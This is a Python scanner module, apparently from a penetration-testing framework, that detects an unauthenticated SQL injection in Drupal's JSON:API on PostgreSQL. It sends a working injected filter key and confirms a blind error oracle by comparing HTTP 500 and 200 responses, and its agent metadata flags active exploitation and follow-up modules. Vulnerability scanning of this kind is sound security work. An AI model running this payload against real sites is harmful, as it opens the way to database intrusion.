#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect Drupal CVE-2026-9082 PostgreSQL JSON:API error-oracle SQLi."""

from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Drupal CVE-2026-9082 PostgreSQL SQLi Detect",
        "description": (
            "Detects CVE-2026-9082 (SA-CORE-2026-004) on PostgreSQL-backed Drupal via "
            "JSON:API filter value array keys. Confirms the blind error oracle: injected "
            "key 0||1/(CASE WHEN (1=1) THEN 0 ELSE 1 END) yields HTTP 500, 1=0 yields "
            "HTTP 200 on GET /jsonapi/{type}?filter[a][condition]..."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-9082"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-9082",
            "https://www.drupal.org/sa-core-2026-004",
            "https://slcyber.io/research-center/keys-to-the-kingdom-anonymous-sql-injection-in-drupal-core-cve-2026-9082/",
        ],
        "modules": ["auxiliary/scanner/http/drupal_cve_2026_9082_sqli"],
        "tags": [
            "web",
            "scanner",
            "drupal",
            "jsonapi",
            "sqli",
            "postgresql",
            "unauthenticated",
            "cve-2026-9082",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["drupal"],
                "endpoint_pattern_any": ["/jsonapi/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sqli", "from_detail": "error oracle confirmed"},
                ],
                "suggested_followups": [
                    "auxiliary/scanner/http/drupal_cve_2026_9082_sqli",
                ],
            },
        },
    }

    port = OptPort(80, "Drupal HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    jsonapi_resource = OptString(
        "node/article",
        "JSON:API resource under /jsonapi/ (empty = auto-discover)",
        False,
        advanced=True,
    )
    active_probe = OptBool(True, "Confirm error oracle (1=1 vs 1=0)", False)

    @staticmethod
    def _injected_key(predicate: str) -> str:
        return f"0||1/(CASE WHEN ({predicate}) THEN 0 ELSE 1 END)"

    def _base(self) -> str:
        val = str(self.path or "/").strip() or "/"
        if not val.startswith("/"):
            val = f"/{val}"
        return val.rstrip("/")

    def _path_url(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _jsonapi_query(self, predicate: str) -> str:
        key = quote(self._injected_key(predicate), safe="")
        return (
            "filter[a][condition][path]=title"
            "&filter[a][condition][operator]=IN"
            "&filter[a][condition][value][0]=x"
            f"&filter[a][condition][value][{key}]=x"
        )

    def _discover_resource(self) -> str:
        forced = str(self.jsonapi_resource or "").strip().strip("/")
        if forced:
            return forced
        response = self.http_request(
            method="GET",
            path=self._path_url("/jsonapi"),
            headers={"Accept": "application/vnd.api+json"},
            allow_redirects=True,
            timeout=int(self.timeout or 20),
        )
        if response and int(response.status_code or 0) == 200:
            try:
                links = (response.json() or {}).get("links") or {}
            except Exception:
                links = {}
            for key in links:
                if str(key).startswith("node--"):
                    return str(key).replace("--", "/")
        for candidate in ("node/article", "node/page", "node/basic_page"):
            probe = self.http_request(
                method="GET",
                path=self._path_url(f"/jsonapi/{candidate}"),
                headers={"Accept": "application/vnd.api+json"},
                allow_redirects=True,
                timeout=int(self.timeout or 20),
            )
            if probe and int(probe.status_code or 0) == 200:
                return candidate
        return ""

    def _probe_status(self, resource: str, predicate: str):
        qs = self._jsonapi_query(predicate)
        response = self.http_request(
            method="GET",
            path=self._path_url(f"/jsonapi/{resource}?{qs}"),
            headers={"Accept": "application/vnd.api+json"},
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        return int(response.status_code or 0) if response else 0

    def run(self):
        if not self.http_request(
            method="GET",
            path=self._path_url("/jsonapi"),
            headers={"Accept": "application/vnd.api+json"},
            allow_redirects=True,
            timeout=int(self.timeout or 20),
        ):
            return False

        resource = self._discover_resource()
        if not resource:
            print_status("JSON:API up but no node resource type found")
            return False

        if not self.active_probe:
            self.set_info(
                severity="medium",
                cve="CVE-2026-9082",
                reason=f"Drupal JSON:API reachable ({resource}); oracle probe disabled",
                path=self._path_url(f"/jsonapi/{resource}"),
            )
            return True

        code_true = self._probe_status(resource, "1=1")
        code_false = self._probe_status(resource, "1=0")
        if code_true == 500 and code_false == 200:
            reason = (
                f"CVE-2026-9082: error oracle on /jsonapi/{resource} "
                f"(1=1 -> HTTP 500, 1=0 -> HTTP 200)"
            )
            print_status("CVE-2026-9082 vuln=True")
            self.set_info(
                severity="critical",
                reason=reason,
                vulnerable=True,
                cve="CVE-2026-9082",
                path=self._path_url(f"/jsonapi/{resource}"),
            )
            return True

        print_status(
            f"CVE-2026-9082 not confirmed on {resource} "
            f"(1=1 HTTP {code_true}, 1=0 HTTP {code_false})"
        )
        return False
